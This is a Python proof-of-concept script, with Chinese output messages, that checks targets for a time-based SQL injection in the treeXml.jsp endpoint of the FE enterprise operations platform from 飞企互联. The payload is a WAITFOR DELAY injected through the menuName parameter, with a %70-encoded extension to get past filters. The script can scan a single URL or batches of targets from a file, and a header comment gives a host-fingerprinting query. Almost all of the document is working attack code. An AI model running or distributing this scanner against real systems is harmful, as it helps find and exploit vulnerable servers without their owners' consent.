#飞企互联-FE企业运营管理平台 treeXml.jsp SQL注入漏洞
#app="FE-协作平台"
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import http.client
import ssl
import argparse
from urllib.parse import urlparse
import time

RED = '\033[91m'
RESET = '\033[0m'

def check_vulnerability(url):
    proxies = {
    'http':'http://127.0.0.1:7890',
    'https':'http://127.0.0.1:7890',
}
    try:
        parsed_url = urlparse(url)
        path = parsed_url.path.rstrip('/') + "/sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:3'--&type=function"

        if parsed_url.scheme == "https":
            conn = http.client.HTTPSConnection(parsed_url.netloc, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(parsed_url.netloc)

        start_time = time.time()
        conn.request("GET", path)
        response = conn.getresponse()
        elapsed_time = time.time() - start_time

        if 3 < elapsed_time < 6:
            print(f"{RED}URL [{url}] 可能存在飞企互联FE企业运营管理平台 treeXml.jsp SQL注入漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")

    except (http.client.HTTPException, ConnectionResetError) as e:
        print(f"URL [{url}] 请求失败: {e}")
    except Exception as e:
        print(f"URL [{url}] 遇到未知错误: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在飞企互联FE企业运营管理平台 treeXml.jsp SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
